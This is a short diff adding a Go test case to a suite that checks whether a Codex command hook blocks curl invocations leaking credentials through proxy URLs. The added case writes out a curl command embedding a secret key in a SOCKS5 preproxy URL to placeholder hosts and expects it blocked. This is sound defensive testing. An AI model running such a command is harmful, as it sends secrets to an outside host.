@@ -155,6 +155,12 @@ func TestEvaluateCodexHookCurlSOCKSProxyCredentialEgress(t *testing.T) {
 			wantBlock: true,
 		},
 		{
+			name: "HTTP chain sends preproxy URL credentials",
+			command: "curl --preproxy socks5h://pre:" + key +
+				"@first.example --proxy http://main.example https://origin.example",
+			wantBlock: true,
+		},
+		{
 			name: "FTP chain sends preproxy URL credentials",
 			command: "curl --preproxy socks5h://pre:" + key +
 				"@first.example --proxy http://main.example ftp://127.0.0.1/file",
